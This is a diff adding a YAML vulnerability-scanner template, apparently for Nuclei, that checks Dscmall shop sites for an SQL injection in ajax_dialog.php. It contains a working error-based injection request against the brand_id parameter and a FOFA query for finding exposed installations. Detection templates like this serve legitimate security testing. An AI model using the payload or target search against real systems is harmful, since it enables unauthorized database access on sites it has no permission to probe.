@@ -1,0 +1,32 @@
+id: dscmail-ajax-dialog-sqli
+
+info:
+  name: Dsmail wholesale_flow - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    大商创多用户商城系统 ajax_dialog.php接口处存在SQL注入漏洞，未经身份验证攻击者可通过输入恶意 SQL 代码，突破系统原本设定的访问规则，未经授权访问、修改或删除数据库中的各类敏感信息，包括但不限于员工个人资料、企业核心业务数据等。进一步利用可获取服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%B8%8A%E6%B5%B7%E5%95%86%E5%88%9B/%E5%A4%A7%E5%95%86%E5%88%9B%E5%A4%9A%E7%94%A8%E6%88%B7%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9Fajax_dialog.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa: body="dsc-choie"
+  tags: Dscmail
+
+http:
+  - raw:
+      - |
+        GET /ajax_dialog.php?_=1600309513833&act=getUserInfo&brand_id=extractvalue(1,concat(0x7e,md5(123456)))&is_jsonp=1&jsoncallback=jQuery19106489774159975068_1600309513832&seckillid=null&temp=backup_tpl_1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "MySQL"
+        condition: and
+
+      - type: status
+        status:
+          - 200
